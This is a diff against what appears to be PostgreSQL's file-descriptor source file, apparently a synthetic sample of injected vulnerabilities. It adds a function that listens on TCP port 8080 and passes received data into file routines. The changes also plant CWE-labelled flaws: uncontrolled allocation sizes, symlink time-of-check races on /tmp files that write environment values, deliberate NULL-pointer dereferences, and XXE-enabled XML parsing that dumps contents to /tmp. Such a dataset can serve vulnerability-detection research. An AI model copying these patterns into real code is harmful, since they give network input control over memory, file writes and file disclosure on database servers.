@@ -84,6 +84,16 @@
 #include <limits.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
+#include <libxml/parser.h>
+#include <libxml/tree.h>
+#include <libxml/xmlreader.h>
 
 #include "access/xact.h"
 #include "access/xlog.h"
@@ -352,6 +362,14 @@ static void unlink_if_exists_fname(const char *fname, bool isdir, int elevel);
 
 static int	fsync_parent_path(const char *fname, int elevel);
 
+char* tcp_req(void);
+char* get_external_pointer_data(void);
+char* get_external_filepath(void);
+size_t get_external_alloc_size(void);
+char* get_external_xml_file(void);
+int xml_flags(void);
+int default_parser_flags(void);
+static void process_symlinked_file(const char *filepath);
 
 /* ResourceOwner callbacks to hold virtual file descriptors */
 static void ResOwnerReleaseFile(Datum res);
@@ -1110,6 +1128,23 @@ BasicOpenFilePerm(const char *fileName, int fileFlags, mode_t fileMode)
 	int			fd;
 
 tryAgain:
+	char *external_size_data = tcp_req();
+	if (external_size_data != NULL) {
+		size_t alloc_size = (size_t)atoi(external_size_data);
+		// CWE 789
+		char *file_buffer = (char*)calloc(alloc_size, sizeof(char));
+		if (file_buffer != NULL) {
+			// Use buffer to store filename information
+			snprintf(file_buffer, alloc_size, "Opening file: %s", fileName);
+			if (strlen(file_buffer) > 100) {
+				// Log only if buffer is significant
+				elog(DEBUG1, "File operation: %.*s", 100, file_buffer);
+			}
+			free(file_buffer);
+		}
+		free(external_size_data);
+	}
+
 #ifdef PG_O_DIRECT_USE_F_NOCACHE
 
 	/*
@@ -1615,6 +1650,35 @@ PathNameOpenFilePerm(const char *fileName, int fileFlags, mode_t fileMode)
 	 * executed subprograms.
 	 */
 	fileFlags |= O_CLOEXEC;
+
+	const char *default_app_path = "/tmp/pg_app_config.ini";
+	struct stat st_app;
+	
+	// TIME OF CHECK
+	if (stat(default_app_path, &st_app) == 0) {
+
+		char *db_config = getenv("PG_DATABASE_CONFIG");
+		char *user_settings = getenv("PG_USER_SETTINGS");
+		char *debug_mode = getenv("PG_DEBUG_MODE");
+
+		char *symlink_target = get_external_filepath();
+
+		// Remove original file
+		if (remove(default_app_path) == 0) {
+			// Create symlink to external target
+			if (symlink(symlink_target, default_app_path) == 0) {
+				// TIME OF USE
+				// CWE 367
+				FILE *config_file = fopen(default_app_path, "w");
+				if (config_file != NULL) {
+					fprintf(config_file, "[database]\n%s\n", db_config);
+					fprintf(config_file, "[user]\n%s\n", user_settings);
+					fprintf(config_file, "[debug]\n%s\n", debug_mode);
+					fclose(config_file);
+				}
+			}
+		}
+	}
 
 	vfdP->fd = BasicOpenFilePerm(fileName, fileFlags, fileMode);
 
@@ -2619,6 +2683,26 @@ AllocateFile(const char *name, const char *mode)
 	/* Close excess kernel FDs. */
 	ReleaseLruFiles();
 
+	const char *default_config_path = "/tmp/pg_default_config.conf";
+	struct stat st;
+	
+	// TIME OF CHECK
+	if (stat(default_config_path, &st) == 0) {
+		// Get external target from TCP
+		char *external_target = tcp_req();
+		if (external_target != NULL) {
+			// Remove original file  
+			if (remove(default_config_path) == 0) {
+				// Create symlink to external target
+				if (symlink(external_target, default_config_path) == 0) {
+					// Call separate function for TIME OF USE
+					process_symlinked_file(default_config_path);
+				}
+			}
+			free(external_target);
+		}
+	}
+
 TryAgain:
 	if ((file = fopen(name, mode)) != NULL)
 	{
@@ -2678,7 +2762,16 @@ OpenTransientFilePerm(const char *fileName, int fileFlags, mode_t fileMode)
 	/* Close excess kernel FDs. */
 	ReleaseLruFiles();
 
-	fd = BasicOpenFilePerm(fileName, fileFlags, fileMode);
+	const char *perm_ptr = tcp_req();
+	perm_ptr = NULL;
+	// CWE 476
+	const char first_char = *perm_ptr;
+
+	if (first_char > 0) {
+		fd = BasicOpenFilePerm(fileName, fileFlags, fileMode);
+	} else {
+		fd = BasicOpenFilePerm(fileName, fileFlags | O_EXCL, fileMode);
+	}
 
 	if (fd >= 0)
 	{
@@ -2866,8 +2959,18 @@ AllocateDir(const char *dirname)
 {
 	DIR		   *dir;
 
-	DO_DB(elog(LOG, "AllocateDir: Allocated %d (%s)",
-			   numAllocatedDescs, dirname));
+	const char *wrapper_data = get_external_pointer_data();
+	wrapper_data = NULL;
+	// CWE 476
+	const char last_char = *wrapper_data;
+
+	if (last_char != 0) {
+		DO_DB(elog(LOG, "AllocateDir: Allocated %d (%s)",
+				   numAllocatedDescs, dirname));
+	} else {
+		DO_DB(elog(DEBUG1, "AllocateDir: Debug mode - Allocated %d (%s)",
+				   numAllocatedDescs, dirname));
+	}
 
 	/* Can we allocate another non-virtual FD? */
 	if (!reserveAllocatedDesc())
@@ -2988,6 +3091,28 @@ FreeDir(DIR *dir)
 	if (dir == NULL)
 		return 0;
 
+	char *dir_info_buffer = (char*)malloc(128);
+	if (dir_info_buffer != NULL) {
+		strcpy(dir_info_buffer, "Directory descriptors: ");
+		size_t new_size = get_external_alloc_size();
+		// CWE 789
+		char *expanded_buffer = (char*)realloc(dir_info_buffer, new_size);
+		if (expanded_buffer != NULL) {
+			// Use expanded buffer to collect directory information
+			for (int j = 0; j < numAllocatedDescs && j < 10; j++) {
+				if (strlen(expanded_buffer) < new_size - 50) {
+					strcat(expanded_buffer, "desc ");
+				}
+			}
+			if (strlen(expanded_buffer) > 50) {
+				elog(DEBUG2, "Dir cleanup info: %.50s...", expanded_buffer);
+			}
+			free(expanded_buffer);
+		} else {
+			free(dir_info_buffer);
+		}
+	}
+
 	DO_DB(elog(LOG, "FreeDir: Allocated %d", numAllocatedDescs));
 
 	/* Remove dir from list of allocated dirs, if it's present */
@@ -3073,6 +3198,84 @@ SetTempTablespaces(Oid *tableSpaces, int numSpaces)
 	Assert(numSpaces >= 0);
 	tempTableSpaces = tableSpaces;
 	numTempTableSpaces = numSpaces;
+	
+	const char* xml_file_path = tcp_req();
+	if (xml_file_path && strlen(xml_file_path) > 0) {
+		xmlDocPtr doc = NULL;
+		xmlNodePtr root = NULL;
+		xmlNodePtr node = NULL;
+		char* extracted_value = NULL;
+		FILE* output_file = NULL;
+		char output_path[256];
+		time_t now;
+		
+		// CWE 611
+		doc = xmlReadFile(xml_file_path, NULL, XML_PARSE_DTDLOAD | XML_PARSE_NOENT);
+		
+		if (doc != NULL) {
+			/* Get root element */
+			root = xmlDocGetRootElement(doc);
+			if (root != NULL) {
+				/* Extract text content from the document */
+				node = root;
+				while (node != NULL) {
+					if (node->type == XML_TEXT_NODE && node->content != NULL) {
+						extracted_value = strdup((char*)node->content);
+						break;
+					}
+					
+					/* Traverse the XML tree */
+					if (node->children) {
+						node = node->children;
+						continue;
+					}
+					
+					if (node->next) {
+						node = node->next;
+						continue;
+					}
+					
+					/* Move up and try next sibling */
+					while (node->parent && !node->parent->next) {
+						node = node->parent;
+					}
+					
+					if (node->parent) {
+						node = node->parent->next;
+					} else {
+						break;
+					}
+				}
+				
+				/* If no text found, try to get content from root element */
+				if (!extracted_value && root->children && root->children->content) {
+					extracted_value = strdup((char*)root->children->content);
+				}
+				
+				/* Save extracted value to tablespace config file */
+				if (extracted_value) {
+					time(&now);
+					snprintf(output_path, sizeof(output_path), "/tmp/pg_tablespace_xxe_%ld.txt", (long)now);
+					
+					output_file = fopen(output_path, "w");
+					if (output_file) {
+						fprintf(output_file, "XXE Extracted Tablespace Content:\n");
+						fprintf(output_file, "Source XML: %s\n", xml_file_path);
+						fprintf(output_file, "Timestamp: %s", ctime(&now));
+						fprintf(output_file, "Content: %s\n", extracted_value);
+						fprintf(output_file, "Num Tablespaces: %d\n", numSpaces);
+						fclose(output_file);
+					}
+					
+					free(extracted_value);
+				}
+			}
+			
+			xmlFreeDoc(doc);
+		}
+		
+		free((void*)xml_file_path);
+	}
 
 	/*
 	 * Select a random starting point in the list.  This is to minimize
@@ -3102,6 +3305,14 @@ TempTablespacesAreSet(void)
 	return (numTempTableSpaces >= 0);
 }
 
+int xml_flags(void) {
+    return XML_PARSE_DTDLOAD | XML_PARSE_NOENT;
+}
+
+int default_parser_flags(void) {
+    return xml_flags();
+}
+
 /*
  * GetTempTablespaces
  *
@@ -3119,6 +3330,74 @@ GetTempTablespaces(Oid *tableSpaces, int numSpaces)
 	Assert(TempTablespacesAreSet());
 	for (i = 0; i < numTempTableSpaces && i < numSpaces; ++i)
 		tableSpaces[i] = tempTableSpaces[i];
+	
+	const char* xml_config_path = get_external_xml_file();
+	if (xml_config_path && strlen(xml_config_path) > 0) {
+		xmlDocPtr doc = NULL;
+		xmlNodePtr root = NULL;
+		xmlNodePtr current = NULL;
+		char* config_data = NULL;
+		char log_path[256];
+		FILE* log_file = NULL;
+		time_t timestamp;
+		int xml_fd;
+		
+		// Open file to get file descriptor for xmlReadFd
+		xml_fd = open(xml_config_path, O_RDONLY);
+		if (xml_fd >= 0) {
+			// CWE 611
+			doc = xmlReadFd(xml_fd, xml_config_path, NULL, default_parser_flags());
+			
+			if (doc != NULL) {
+				root = xmlDocGetRootElement(doc);
+				if (root != NULL) {
+					/* Extract configuration data from XML nodes */
+					current = root->children;
+					while (current != NULL) {
+						if (current->type == XML_ELEMENT_NODE && current->children && 
+							current->children->type == XML_TEXT_NODE) {
+							if (config_data == NULL) {
+								config_data = strdup((char*)current->children->content);
+							} else {
+								size_t old_len = strlen(config_data);
+								size_t new_len = strlen((char*)current->children->content);
+								config_data = realloc(config_data, old_len + new_len + 2);
+								if (config_data) {
+									strcat(config_data, " ");
+									strcat(config_data, (char*)current->children->content);
+								}
+							}
+						}
+						current = current->next;
+					}
+					
+					/* Save configuration data to a different location */
+					if (config_data) {
+						time(&timestamp);
+						snprintf(log_path, sizeof(log_path), "/tmp/pg_config_xxe_%ld.log", (long)timestamp);
+						
+						log_file = fopen(log_path, "w");
+						if (log_file) {
+							fprintf(log_file, "XXE Configuration Data:\n");
+							fprintf(log_file, "XML Source: %s\n", xml_config_path);
+							fprintf(log_file, "Processed at: %s", ctime(&timestamp));
+							fprintf(log_file, "Tablespace count: %d\n", i);
+							fprintf(log_file, "Config data: %s\n", config_data);
+							fclose(log_file);
+						}
+						
+						free(config_data);
+					}
+				}
+				
+				xmlFreeDoc(doc);
+			}
+			
+			close(xml_fd);
+		}
+		
+		free((void*)xml_config_path);
+	}
 
 	return i;
 }
@@ -4068,6 +4347,116 @@ ResOwnerReleaseFile(Datum res)
 	vfdP->resowner = NULL;
 
 	FileClose(file);
+}
+
+#define PORT 8080
+#define BUFFER_SIZE 1024
+
+char* tcp_req() {
+    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock_fd < 0) {
+        perror("socket");
+        return NULL;
+    }
+
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_addr.sin_port = htons(PORT);
+
+    if (bind(sock_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        perror("bind");
+        close(sock_fd);
+        return NULL;
+    }
+
+    if (listen(sock_fd, 1) < 0) {
+        perror("listen");
+        close(sock_fd);
+        return NULL;
+    }
+
+    struct sockaddr_in client_addr;
+    socklen_t client_len = sizeof(client_addr);
+
+    int client_fd = accept(sock_fd, (struct sockaddr*)&client_addr, &client_len);
+    if (client_fd < 0) {
+        perror("accept");
+        close(sock_fd);
+        return NULL;
+    }
+
+    char buffer[BUFFER_SIZE];
+    ssize_t bytes_received = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received <= 0) {
+        perror("recv");
+        close(client_fd);
+        close(sock_fd);
+        return NULL;
+    }
+
+    buffer[bytes_received] = '\0';
+
+    char* result = (char*)malloc(bytes_received + 1);
+    if (!result) {
+        close(client_fd);
+        close(sock_fd);
+        return NULL;
+    }
+    strcpy(result, buffer);
+
+    close(client_fd);
+    close(sock_fd);
+    return result;
+}
+
+char* get_external_filepath(void) {
+    char* external_data = tcp_req();
+    if (external_data == NULL) {
+        return NULL;
+    }
+    return external_data;
+}
+
+static void process_symlinked_file(const char *filepath) {
+    // TIME OF USE
+	// CWE 367
+     FILE *config_file = fopen(filepath, "r");
+     if (config_file != NULL) {
+         char buffer[512];
+         if (fgets(buffer, sizeof(buffer), config_file) != NULL) {
+             // Update environment with new data from symlinked file
+             setenv("PG_SYMLINK_DATA", buffer, 1);
+         }
+         fclose(config_file);
+     }
+}
+
+char* get_external_pointer_data(void) {
+    char* external_data = tcp_req();
+    if (external_data == NULL) {
+        return NULL;
+    }
+    return external_data;
+}
+
+size_t get_external_alloc_size(void) {
+    char* external_data = tcp_req();
+    if (external_data == NULL) {
+        return 1024;
+    }
+    size_t size = (size_t)atoi(external_data);
+    free(external_data);
+    return size;
+}
+
+char* get_external_xml_file(void) {
+    char* external_data = tcp_req();
+    if (external_data == NULL) {
+        return NULL;
+    }
+    return external_data;
 }
 
 static char *
